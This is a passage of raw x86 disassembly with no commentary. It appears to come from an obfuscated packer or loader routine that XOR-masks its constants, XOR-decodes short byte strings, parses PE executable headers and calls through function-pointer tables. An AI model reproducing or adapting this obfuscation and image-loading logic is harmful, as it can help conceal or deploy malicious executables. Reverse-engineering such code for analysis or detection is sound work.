  425050:	add    ecx,esi
  425052:	or     eax,ecx
  425054:	mov    ecx,DWORD PTR [ebp-0x30]
  425057:	xor    ecx,ebx
  425059:	add    eax,ecx
  42505b:	mov    ecx,DWORD PTR [ebp-0x30]
  42505e:	xor    ecx,ebx
  425060:	add    eax,ecx
  425062:	mov    ecx,DWORD PTR [ebp-0xc]
  425065:	lea    eax,[eax+ecx*1+0x64e5ec]
  42506c:	jmp    0x42507d
  42506e:	mov    eax,DWORD PTR [ebp-0x30]
  425071:	mov    ecx,DWORD PTR [ebp-0xc]
  425074:	xor    eax,ebx
  425076:	lea    eax,[eax+ecx*1+0x3272f6]
  42507d:	mov    DWORD PTR [ebp-0xc],eax
  425080:	mov    eax,DWORD PTR [ebp-0x30]
  425083:	xor    eax,ebx
  425085:	mov    ecx,0xffcd8d0a
  42508a:	sub    ecx,eax
  42508c:	add    ecx,DWORD PTR [ebp-0x28]
  42508f:	mov    eax,DWORD PTR [ebp-0x30]
  425092:	mov    edx,DWORD PTR [ebp-0xc]
  425095:	xor    eax,ebx
  425097:	add    eax,esi
  425099:	imul   eax,edx
  42509c:	cmp    eax,ecx
  42509e:	jbe    0x424eb0
  4250a4:	mov    eax,DWORD PTR [ebp-0x10]
  4250a7:	mov    ecx,DWORD PTR [ebp-0x3c]
  4250aa:	mov    eax,DWORD PTR [ebp+0x8]
  4250ad:	mov    edx,DWORD PTR [ebp-0x54]
  4250b0:	mov    eax,DWORD PTR [eax+0x1e0]
  4250b6:	xor    edx,ebx
  4250b8:	add    edx,esi
  4250ba:	push   edx
  4250bb:	mov    edx,DWORD PTR [ebp-0x40]
  4250be:	xor    edx,ebx
  4250c0:	add    edx,esi
  4250c2:	push   edx
  4250c3:	push   ecx
  4250c4:	mov    DWORD PTR [ebp-0x38],ecx
  4250c7:	mov    ecx,DWORD PTR [ebp-0x10]
  4250ca:	xor    ecx,ebx
  4250cc:	add    ecx,esi
  4250ce:	push   ecx
  4250cf:	call   DWORD PTR [eax+0x14]
  4250d2:	mov    edi,eax
  4250d4:	mov    eax,DWORD PTR [ebp-0x10]
  4250d7:	xor    eax,ebx
  4250d9:	add    eax,esi
  4250db:	cmp    eax,edi
  4250dd:	je     0x425138
  4250df:	mov    eax,DWORD PTR [ebp-0x10]
  4250e2:	jmp    0x425105
  4250e4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4250e7:	xor    eax,ebx
  4250e9:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f6]
  4250f0:	mov    BYTE PTR [eax+edi*1+0x3272f6],cl
  4250f7:	mov    ecx,DWORD PTR [ebp-0x18]
  4250fa:	xor    ecx,ebx
  4250fc:	lea    eax,[ecx+eax*1+0x3272f6]
  425103:	xor    eax,ebx
  425105:	mov    ecx,DWORD PTR [ebp-0x3c]
  425108:	sub    ecx,esi
  42510a:	xor    ecx,ebx
  42510c:	cmp    eax,ecx
  42510e:	jne    0x4250e4
  425110:	mov    eax,DWORD PTR [ebp+0x8]
  425113:	mov    ecx,DWORD PTR [ebp-0x50]
  425116:	mov    eax,DWORD PTR [eax+0x1e0]
  42511c:	xor    ecx,ebx
  42511e:	add    ecx,esi
  425120:	push   ecx
  425121:	mov    ecx,DWORD PTR [ebp-0x10]
  425124:	xor    ecx,ebx
  425126:	add    ecx,esi
  425128:	push   ecx
  425129:	push   DWORD PTR [ebp-0x2c]
  42512c:	call   DWORD PTR [eax+0x18]
  42512f:	mov    eax,DWORD PTR [ebp-0x38]
  425132:	mov    DWORD PTR [ebp-0x2c],edi
  425135:	mov    DWORD PTR [ebp-0x3c],eax
  425138:	mov    eax,DWORD PTR [ebp-0x2c]
  42513b:	mov    DWORD PTR [ebp-0x14],eax
  42513e:	mov    eax,DWORD PTR [ebp-0x18]
  425141:	mov    ecx,DWORD PTR [ebp-0x10]
  425144:	xor    eax,ebx
  425146:	add    eax,esi
  425148:	mov    DWORD PTR [ebp-0x5c],0x422b332b
  42514f:	mov    DWORD PTR [ebp-0x58],0x382b402b
  425156:	jmp    0x425189
  425158:	mov    edx,DWORD PTR [ebp-0x14]
  42515b:	mov    edi,ecx
  42515d:	xor    edi,ebx
  42515f:	mov    cl,BYTE PTR [ebp+edi*1+0x32729a]
  425166:	movsx  edx,BYTE PTR [edi+edx*1+0x3272f6]
  42516e:	xor    cl,0x7f
  425171:	add    cl,0x4
  425174:	movzx  ecx,cl
  425177:	cmp    edx,ecx
  425179:	jne    0x425193
  42517b:	mov    ecx,DWORD PTR [ebp-0x18]
  42517e:	xor    ecx,ebx
  425180:	lea    ecx,[ecx+edi*1+0x3272f6]
  425187:	xor    ecx,ebx
  425189:	cmp    ecx,0xf89c85bd
  42518f:	jne    0x425158
  425191:	jmp    0x42519a
  425193:	mov    eax,DWORD PTR [ebp-0x10]
  425196:	xor    eax,ebx
  425198:	add    eax,esi
  42519a:	mov    ecx,DWORD PTR [ebp-0x10]
  42519d:	xor    ecx,ebx
  42519f:	add    ecx,esi
  4251a1:	cmp    ecx,eax
  4251a3:	je     0x425319
  4251a9:	mov    eax,DWORD PTR [ebp-0x14]
  4251ac:	mov    eax,DWORD PTR [eax+0x8]
  4251af:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  4251b6:	mov    DWORD PTR [ebp-0x40],0xf89cc3d6
  4251bd:	mov    DWORD PTR [ebp-0x44],0xf89cb5a5
  4251c4:	mov    DWORD PTR [ebp-0x24],0xf89c85a1
  4251cb:	mov    DWORD PTR [ebp-0x20],eax
  4251ce:	mov    eax,DWORD PTR [ebp+0x8]
  4251d1:	mov    ecx,DWORD PTR [ebp-0x24]
  4251d4:	xor    ecx,ebx
  4251d6:	add    ecx,esi
  4251d8:	push   ecx
  4251d9:	mov    ecx,DWORD PTR [ebp-0x44]
  4251dc:	mov    eax,DWORD PTR [eax+0x1e0]
  4251e2:	xor    ecx,ebx
  4251e4:	add    ecx,esi
  4251e6:	push   ecx
  4251e7:	mov    ecx,DWORD PTR [ebp-0x40]
  4251ea:	xor    ecx,ebx
  4251ec:	add    ecx,esi
  4251ee:	push   ecx
  4251ef:	mov    ecx,DWORD PTR [ebp-0xc]
  4251f2:	xor    ecx,ebx
  4251f4:	add    ecx,esi
  4251f6:	push   ecx
  4251f7:	call   DWORD PTR [eax+0x14]
  4251fa:	mov    edi,eax
  4251fc:	mov    eax,DWORD PTR [ebp+0x8]
  4251ff:	mov    ecx,DWORD PTR [ebp-0x24]
  425202:	mov    eax,DWORD PTR [eax+0x1e0]
  425208:	xor    ecx,ebx
  42520a:	add    ecx,esi
  42520c:	push   ecx
  42520d:	mov    ecx,DWORD PTR [ebp-0x44]
  425210:	xor    ecx,ebx
  425212:	add    ecx,esi
  425214:	push   ecx
  425215:	mov    ecx,DWORD PTR [ebp-0xc]
  425218:	push   DWORD PTR [ebp-0x20]
  42521b:	xor    ecx,ebx
  42521d:	add    ecx,esi
  42521f:	push   ecx
  425220:	call   DWORD PTR [eax+0x14]
  425223:	mov    ecx,DWORD PTR [ebp-0xc]
  425226:	xor    ecx,ebx
  425228:	add    ecx,esi
  42522a:	mov    DWORD PTR [ebp-0x24],eax
  42522d:	cmp    ecx,edi
  42522f:	je     0x4255bc
  425235:	mov    ecx,DWORD PTR [ebp-0xc]
  425238:	xor    ecx,ebx
  42523a:	add    ecx,esi
  42523c:	cmp    ecx,eax
  42523e:	je     0x4255bc
  425244:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  42524b:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  425252:	mov    ecx,DWORD PTR [ebp-0x40]
  425255:	xor    cl,0xaf
  425258:	sub    cl,0xa
  42525b:	mov    BYTE PTR [edi],cl
  42525d:	mov    ecx,DWORD PTR [ebp-0xc]
  425260:	xor    cl,0xaf
  425263:	sub    cl,0xa
  425266:	mov    BYTE PTR [edi+0x1],cl
  425269:	mov    ecx,DWORD PTR [ebp-0x54]
  42526c:	xor    cl,0xaf
  42526f:	sub    cl,0xa
  425272:	mov    BYTE PTR [edi+0x2],cl
  425275:	and    DWORD PTR [ebp-0xc8],0x0
  42527c:	and    DWORD PTR [ebp-0xdc],0x0
  425283:	lea    ecx,[ebp-0xdc]
  425289:	push   ecx
  42528a:	push   DWORD PTR [ebp-0x20]
  42528d:	push   eax
  42528e:	lea    eax,[ebp-0xc8]
  425294:	push   eax
  425295:	mov    eax,DWORD PTR [ebp-0x14]
  425298:	push   DWORD PTR [eax+0xc]
  42529b:	mov    eax,DWORD PTR [ebp-0x2c]
  42529e:	add    eax,0x10
  4252a1:	push   eax
  4252a2:	push   edi
  4252a3:	call   0x424547
  4252a8:	mov    DWORD PTR [ebp-0x40],eax
  4252ab:	mov    eax,DWORD PTR [ebp+0x8]
  4252ae:	mov    ecx,DWORD PTR [ebp-0x50]
  4252b1:	mov    eax,DWORD PTR [eax+0x1e0]
  4252b7:	xor    ecx,ebx
  4252b9:	add    ecx,esi
  4252bb:	push   ecx
  4252bc:	mov    ecx,DWORD PTR [ebp-0xc]
  4252bf:	xor    ecx,ebx
  4252c1:	add    ecx,esi
  4252c3:	push   ecx
  4252c4:	push   edi
  4252c5:	call   DWORD PTR [eax+0x18]
  4252c8:	mov    eax,DWORD PTR [ebp-0x40]
  4252cb:	add    eax,0xffcd8d0a
  4252d0:	xor    eax,ebx
  4252d2:	cmp    eax,0xf89c85a5
  4252d7:	mov    eax,DWORD PTR [ebp+0x8]
  4252da:	mov    eax,DWORD PTR [eax+0x1e0]
  4252e0:	mov    ecx,DWORD PTR [ebp-0x50]
  4252e3:	jne    0x425306
  4252e5:	xor    ecx,ebx
  4252e7:	add    ecx,esi
  4252e9:	push   ecx
  4252ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4252ed:	xor    ecx,ebx
  4252ef:	add    ecx,esi
  4252f1:	push   ecx
  4252f2:	push   DWORD PTR [ebp-0x2c]
  4252f5:	call   DWORD PTR [eax+0x18]
  4252f8:	mov    eax,DWORD PTR [ebp-0x24]
  4252fb:	mov    DWORD PTR [ebp-0x2c],eax
  4252fe:	mov    eax,DWORD PTR [ebp-0x20]
  425301:	mov    DWORD PTR [ebp-0x3c],eax
  425304:	jmp    0x425319
  425306:	xor    ecx,ebx
  425308:	add    ecx,esi
  42530a:	push   ecx
  42530b:	mov    ecx,DWORD PTR [ebp-0xc]
  42530e:	xor    ecx,ebx
  425310:	add    ecx,esi
  425312:	push   ecx
  425313:	push   DWORD PTR [ebp-0x24]
  425316:	call   DWORD PTR [eax+0x18]
  425319:	mov    eax,DWORD PTR [ebp-0x3c]
  42531c:	mov    DWORD PTR [ebp-0x34],eax
  42531f:	mov    eax,DWORD PTR [ebp-0x2c]
  425322:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  425329:	mov    DWORD PTR [ebp-0x40],eax
  42532c:	mov    edi,0xf89c85a4
  425331:	mov    DWORD PTR [ebp-0x30],edi
  425334:	mov    eax,DWORD PTR [ebp-0x28]
  425337:	xor    eax,ebx
  425339:	add    eax,esi
  42533b:	mov    DWORD PTR [ebp-0xc],eax
  42533e:	mov    eax,DWORD PTR [ebp-0x28]
  425341:	xor    eax,ebx
  425343:	add    eax,esi
  425345:	mov    DWORD PTR [ebp-0x14],eax
  425348:	mov    DWORD PTR [ebp-0x44],0xf89c8585
  42534f:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  425356:	mov    eax,DWORD PTR [ebp-0x28]
  425359:	mov    ecx,DWORD PTR [ebp-0x34]
  42535c:	xor    eax,ebx
  42535e:	add    eax,esi
  425360:	cmp    ecx,eax
  425362:	je     0x425558
  425368:	jmp    0x425534
  42536d:	mov    ecx,DWORD PTR [ebp-0xc]
  425370:	mov    eax,DWORD PTR [ebp-0x34]
  425373:	sub    eax,ecx
  425375:	mov    ecx,DWORD PTR [ebp-0x44]
  425378:	xor    ecx,ebx
  42537a:	add    ecx,esi
  42537c:	xor    edx,edx
  42537e:	div    ecx
  425380:	mov    DWORD PTR [ebp-0x14],eax
  425383:	mov    eax,DWORD PTR [ebp-0x24]
  425386:	mov    ecx,DWORD PTR [ebp-0x14]
  425389:	xor    eax,ebx
  42538b:	add    eax,esi
  42538d:	cmp    ecx,eax
  42538f:	jbe    0x42539b
  425391:	mov    eax,DWORD PTR [ebp-0x24]
  425394:	xor    eax,ebx
  425396:	add    eax,esi
  425398:	mov    DWORD PTR [ebp-0x14],eax
  42539b:	mov    eax,DWORD PTR [ebp-0x44]
  42539e:	mov    ecx,DWORD PTR [ebp-0x14]
  4253a1:	xor    eax,ebx
  4253a3:	add    eax,esi
  4253a5:	imul   eax,ecx
  4253a8:	mov    DWORD PTR [ebp-0x14],eax
  4253ab:	mov    eax,DWORD PTR [ebp-0x28]
  4253ae:	mov    ecx,DWORD PTR [ebp-0x14]
  4253b1:	xor    eax,ebx
  4253b3:	add    eax,esi
  4253b5:	cmp    ecx,eax
  4253b7:	je     0x425522
  4253bd:	mov    eax,DWORD PTR [ebp-0x14]
  4253c0:	mov    DWORD PTR [ebp-0x20],eax
  4253c3:	mov    eax,DWORD PTR [ebp-0xc]
  4253c6:	add    eax,DWORD PTR [ebp-0x40]
  4253c9:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  4253d0:	mov    DWORD PTR [ebp-0x14],edi
  4253d3:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  4253da:	mov    DWORD PTR [ebp-0x1c],eax
  4253dd:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  4253e4:	mov    DWORD PTR [ebp-0x8],edi
  4253e7:	mov    eax,DWORD PTR [ebp-0x4c]
  4253ea:	xor    eax,ebx
  4253ec:	add    eax,esi
  4253ee:	jmp    0x4254e1
  4253f3:	mov    DWORD PTR [ebp-0xe4],0xf89c85ba
  4253fd:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  425407:	mov    eax,DWORD PTR [ebp-0x8]
  42540a:	mov    ecx,DWORD PTR [ebp-0x18]
  42540d:	xor    eax,ebx
  42540f:	add    eax,esi
  425411:	imul   eax,ecx
  425414:	mov    ecx,DWORD PTR [ebp-0x1c]
  425417:	mov    al,BYTE PTR [eax+ecx*1]
  42541a:	mov    BYTE PTR [ebp-0x1],al
  42541d:	mov    eax,DWORD PTR [ebp-0x8]
  425420:	mov    ecx,DWORD PTR [ebp-0x18]
  425423:	xor    eax,ebx
  425425:	add    eax,esi
  425427:	imul   eax,ecx
  42542a:	mov    ecx,DWORD PTR [ebp-0x54]
  42542d:	xor    ecx,ebx
  42542f:	add    eax,ecx
  425431:	mov    ecx,DWORD PTR [ebp-0x1c]
  425434:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42543c:	mov    ecx,DWORD PTR [ebp-0xe4]
  425442:	xor    ecx,ebx
  425444:	lea    eax,[ecx+eax*1+0x3272f6]
  42544b:	movzx  ecx,BYTE PTR [ebp-0x1]
  42544f:	xor    ecx,eax
  425451:	mov    BYTE PTR [ebp-0x1],cl
  425454:	mov    al,BYTE PTR [ebp-0x1]
  425457:	mov    ecx,DWORD PTR [ebp-0x8]
  42545a:	mov    edx,DWORD PTR [ebp-0x18]
  42545d:	xor    ecx,ebx
  42545f:	add    ecx,esi
  425461:	imul   ecx,edx
  425464:	mov    edx,DWORD PTR [ebp-0x1c]
  425467:	mov    BYTE PTR [ecx+edx*1],al
  42546a:	mov    eax,DWORD PTR [ebp-0x8]
  42546d:	mov    ecx,DWORD PTR [ebp-0x18]
  425470:	xor    eax,ebx
  425472:	add    eax,esi
  425474:	imul   eax,ecx
  425477:	mov    ecx,DWORD PTR [ebp-0x1c]
  42547a:	mov    al,BYTE PTR [eax+ecx*1]
  42547d:	mov    BYTE PTR [ebp-0x1],al
  425480:	mov    eax,DWORD PTR [ebp-0x8]
  425483:	mov    ecx,DWORD PTR [ebp-0x18]
  425486:	xor    eax,ebx
  425488:	add    eax,esi
  42548a:	imul   eax,ecx
  42548d:	mov    ecx,DWORD PTR [ebp-0x14]
  425490:	xor    ecx,ebx
  425492:	add    eax,ecx
  425494:	mov    ecx,DWORD PTR [ebp-0x1c]
  425497:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f6]
  42549f:	mov    ecx,DWORD PTR [ebp-0xd0]
  4254a5:	xor    ecx,ebx
  4254a7:	lea    eax,[ecx+eax*1+0x3272f6]
  4254ae:	movzx  ecx,BYTE PTR [ebp-0x1]
  4254b2:	xor    ecx,eax
  4254b4:	mov    BYTE PTR [ebp-0x1],cl
  4254b7:	mov    al,BYTE PTR [ebp-0x1]
  4254ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4254bd:	mov    edx,DWORD PTR [ebp-0x18]
  4254c0:	xor    ecx,ebx
  4254c2:	add    ecx,esi
  4254c4:	imul   ecx,edx
  4254c7:	mov    edx,DWORD PTR [ebp-0x1c]
  4254ca:	mov    BYTE PTR [ecx+edx*1],al
  4254cd:	mov    eax,DWORD PTR [ebp-0x38]
  4254d0:	mov    ecx,DWORD PTR [ebp-0x14]
  4254d3:	xor    eax,ebx
  4254d5:	xor    ecx,ebx
  4254d7:	add    eax,esi
  4254d9:	add    ecx,esi
  4254db:	imul   eax,ecx
  4254de:	add    eax,DWORD PTR [ebp-0x18]
  4254e1:	mov    DWORD PTR [ebp-0x18],eax
  4254e4:	mov    eax,DWORD PTR [ebp-0x18]
  4254e7:	mov    ecx,DWORD PTR [ebp-0x20]
  4254ea:	cmp    ecx,eax
  4254ec:	jb     0x4253f3
  4254f2:	mov    eax,DWORD PTR [ebp-0x14]
  4254f5:	mov    ecx,DWORD PTR [ebp-0x20]
  4254f8:	xor    eax,ebx
  4254fa:	add    eax,esi
  4254fc:	imul   eax,ecx
  4254ff:	mov    ecx,DWORD PTR [ebp-0x4c]
  425502:	xor    ecx,ebx
  425504:	add    ecx,esi
  425506:	or     eax,ecx
  425508:	mov    ecx,DWORD PTR [ebp-0x30]
  42550b:	xor    ecx,ebx
  42550d:	add    eax,ecx
  42550f:	mov    ecx,DWORD PTR [ebp-0x30]
  425512:	xor    ecx,ebx
  425514:	add    eax,ecx
  425516:	mov    ecx,DWORD PTR [ebp-0xc]
  425519:	lea    eax,[eax+ecx*1+0x64e5ec]
  425520:	jmp    0x425531
  425522:	mov    eax,DWORD PTR [ebp-0x30]
  425525:	mov    ecx,DWORD PTR [ebp-0xc]
  425528:	xor    eax,ebx
  42552a:	lea    eax,[eax+ecx*1+0x3272f6]
  425531:	mov    DWORD PTR [ebp-0xc],eax
  425534:	mov    eax,DWORD PTR [ebp-0x30]
  425537:	xor    eax,ebx
  425539:	mov    ecx,0xffcd8d0a
  42553e:	sub    ecx,eax
  425540:	add    ecx,DWORD PTR [ebp-0x34]
  425543:	mov    eax,DWORD PTR [ebp-0x30]
  425546:	mov    edx,DWORD PTR [ebp-0xc]
  425549:	xor    eax,ebx
  42554b:	add    eax,esi
  42554d:	imul   eax,edx
  425550:	cmp    eax,ecx
  425552:	jbe    0x42536d
  425558:	push   DWORD PTR [ebp+0x8]
  42555b:	mov    eax,DWORD PTR [ebp+0x8]
  42555e:	push   DWORD PTR [eax+0x1cc]
  425564:	lea    eax,[ebp-0xd8]
  42556a:	push   eax
  42556b:	mov    eax,DWORD PTR [ebp+0x8]
  42556e:	mov    eax,DWORD PTR [eax+0x1c4]
  425574:	push   DWORD PTR [eax]
  425576:	mov    eax,DWORD PTR [ebp+0x8]
  425579:	mov    eax,DWORD PTR [eax+0x1c0]
  42557f:	push   DWORD PTR [eax]
  425581:	push   DWORD PTR [ebp-0x3c]
  425584:	push   DWORD PTR [ebp-0x2c]
  425587:	call   0x42601e
  42558c:	mov    DWORD PTR [ebp-0x40],eax
  42558f:	mov    eax,DWORD PTR [ebp-0x10]
  425592:	mov    ecx,DWORD PTR [ebp-0x2c]
  425595:	xor    eax,ebx
  425597:	add    eax,esi
  425599:	cmp    eax,ecx
  42559b:	je     0x4255bc
  42559d:	mov    eax,DWORD PTR [ebp+0x8]
  4255a0:	mov    ecx,DWORD PTR [ebp-0x50]
  4255a3:	mov    eax,DWORD PTR [eax+0x1e0]
  4255a9:	xor    ecx,ebx
  4255ab:	add    ecx,esi
  4255ad:	push   ecx
  4255ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4255b1:	xor    ecx,ebx
  4255b3:	add    ecx,esi
  4255b5:	push   ecx
  4255b6:	push   DWORD PTR [ebp-0x2c]
  4255b9:	call   DWORD PTR [eax+0x18]
  4255bc:	pop    edi
  4255bd:	pop    esi
  4255be:	pop    ebx
  4255bf:	leave  
  4255c0:	ret    0x4
  4255c3:	push   ebp
  4255c4:	mov    ebp,esp
  4255c6:	push   ecx
  4255c7:	push   ecx
  4255c8:	lea    eax,[ebp-0x8]
  4255cb:	mov    DWORD PTR [ebp-0x4],eax
  4255ce:	push   esi
  4255cf:	mov    esi,DWORD PTR [ebp-0x4]
  4255d2:	mov    eax,0xf881ba2f
  4255d7:	mov    DWORD PTR [esi],eax
  4255d9:	mov    esi,DWORD PTR [ebp-0x8]
  4255dc:	cmp    esi,eax
  4255de:	pop    esi
  4255df:	jne    0x4255e9
  4255e1:	mov    BYTE PTR [ecx+0xa],0x83
  4255e5:	mov    BYTE PTR [edx+0x8],0x30
  4255e9:	mov    BYTE PTR [edx+0xa],0x83
  4255ed:	mov    BYTE PTR [ecx+0x2],0x15
  4255f1:	leave  
  4255f2:	ret    
  4255f3:	push   ebp
  4255f4:	mov    ebp,esp
  4255f6:	push   ecx
  4255f7:	push   ecx
  4255f8:	lea    eax,[ebp-0x8]
  4255fb:	mov    DWORD PTR [ebp-0x4],eax
  4255fe:	mov    edx,DWORD PTR [ebp-0x4]
  425601:	mov    eax,0xf88b0bcb
  425606:	mov    DWORD PTR [edx],eax
  425608:	mov    edx,DWORD PTR [ebp-0x8]
  42560b:	cmp    edx,eax
  42560d:	jne    0x42561e
  42560f:	mov    eax,DWORD PTR [ebp+0x8]
  425612:	mov    BYTE PTR [ecx+0x9],0xf
  425616:	mov    BYTE PTR [eax+0x7],0x58
  42561a:	mov    BYTE PTR [ecx+0x6],0x10
  42561e:	mov    BYTE PTR [ecx+0x3],0x1f
  425622:	leave  
  425623:	ret    0x4
  425626:	push   ebp
  425627:	mov    ebp,esp
  425629:	push   ecx
  42562a:	push   ecx
  42562b:	lea    eax,[ebp-0x8]
  42562e:	mov    DWORD PTR [ebp-0x4],eax
  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
